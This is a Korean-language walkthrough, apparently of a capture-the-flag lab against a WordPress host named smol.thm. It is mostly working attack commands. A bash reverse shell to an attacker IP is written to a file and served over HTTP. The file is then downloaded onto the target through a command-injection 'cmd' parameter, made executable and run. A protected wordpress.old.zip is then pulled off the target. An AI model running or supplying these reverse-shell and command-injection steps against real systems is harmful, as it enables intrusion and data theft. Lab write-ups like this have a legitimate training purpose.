````markdown
## Python3 설치 및 리버스 쉘 서버 실행법

1. **Python3 설치**

```bash
sudo apt update
sudo apt install python3
```
````

2. **리버스 쉘 스크립트 작성**

```bash
echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.8.136.212/1234 0>&1'" > rev.sh
```

3. **공격자가 악성 스크립트 배포를 위한 서빙**

```bash
python3 -m http.server 80
sudo netstat -tulnp | grep :80
kill -9 2061
```

- 현재 디렉터리 파일을 80 포트로 서비스함

4. **타겟에서 스크립트 다운로드**

```bash
# browser url
http://www.smol.thm/wp-admin/index.php?cmd=wget http://10.8.136.212:80/rev.sh -O /tmp/rev.sh

# curl
curl -b cookie.txt -L http://www.smol.thm/wp-admin/profile.php?cmd=wget http://10.8.136.212:80/rev.sh -O /tmp/rev.sh
curl -b cookie.txt -L http://www.smol.thm/wp-admin/profile.php?cmd=chmod +x /tmp/rev.sh
curl -b cookie.txt -L http://www.smol.thm/wp-admin/profile.php?cmd=cat /tmp/rev.sh > tmp.txt
```

5. **타겟에서 리버스 쉘 실행**

```
http://www.smol.thm/wp-admin/index.php?cmd=bash /tmp/rev.sh
```

# 타킷에서 unzip wordpress.old.zip -> 암호화 걸림 -> 다운로드 필요

wordpress.old wordpress.old.zip
gege@ip-10-10-97-230:~$ unzip wordpress.old.zip
Archive: wordpress.old.zip
[wordpress.old.zip] wordpress.old/wp-config.php password:

# python3 -m http.server 8080 -> 타겟에서 서버 오픈

[wordpress.old.zip] wordpress.old/wp-config.php password: gege@ip-10-10-97-230:~$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...

# attacker -> 공격자에서 요청 설치 -> 서버를 오픈했던 path 를 기반으로 설치할 파일 요청

wget http://www.smol.thm:8080/wordpress.old.zip
